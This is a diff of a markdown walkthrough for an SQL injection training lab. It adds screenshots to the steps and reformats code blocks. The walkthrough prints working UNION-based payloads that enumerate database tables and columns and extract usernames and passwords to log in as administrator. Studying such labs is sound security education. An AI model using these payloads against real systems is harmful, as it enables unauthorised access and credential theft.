@@ -21,20 +21,32 @@ perform a SQL injection UNION attack to identify the database Schema.
 ``  
 '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
 ``  
-here we can see that there are multible tables start with pg_ which suggest it is a postgerSQL database. We are particularly interested in finding the user table to retirve administrator credentials, let's see how to do that.
+here we can see that there are multible tables start with pg_ which suggests it is a postgerSQL database. We are particularly interested in finding the user table to retirve administrator credentials, let's see how to do that.
+
+![Listing the tables in the database](../assets/SQL%20Injection/Lab%2005%20-%20Retrieve%20Database%20Schema/step-01-list-database-tables.png)
 
 5. Find the name of the table containing user credentials.
 Use the following payload to retrieve the details of the columns in the table:
 ``  
 '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_ebgdei'--
 ``  
+
+![Finding the credential columns with Intruder](../assets/SQL%20Injection/Lab%2005%20-%20Retrieve%20Database%20Schema/step-02-find-users-table-columns-intruder.png)
+
+![The response shows the users table column names](../assets/SQL%20Injection/Lab%2005%20-%20Retrieve%20Database%20Schema/step-03-find-users-table-columns-response.png)
 6. Find the names of the columns containing usernames and passwords.
 Use the following payload to retrieve the usernames and passwords for all users:
-``  
+
+```SQL  
 '+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
-``  
+```  
+
+![Retrieving the administrator account information](../assets/SQL%20Injection/Lab%2005%20-%20Retrieve%20Database%20Schema/step-04-retrieve-administrator-credentials.png)
+
 7. Find the password for the administrator user, and use it to log in.
 8. Congratulation! We logged in successfully.
+
+![Administrator login succeeds](../assets/SQL%20Injection/Lab%2005%20-%20Retrieve%20Database%20Schema/step-05-administrator-login-success.png)
 
 ## A bit of theory  
 Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.
@@ -81,4 +93,3 @@ This output shows the columns in the `Users` table and the data type of each col
 ## Result
 ✅ Retrieve the type and version of the database software.  
 ✅ Lab solved successfully
-
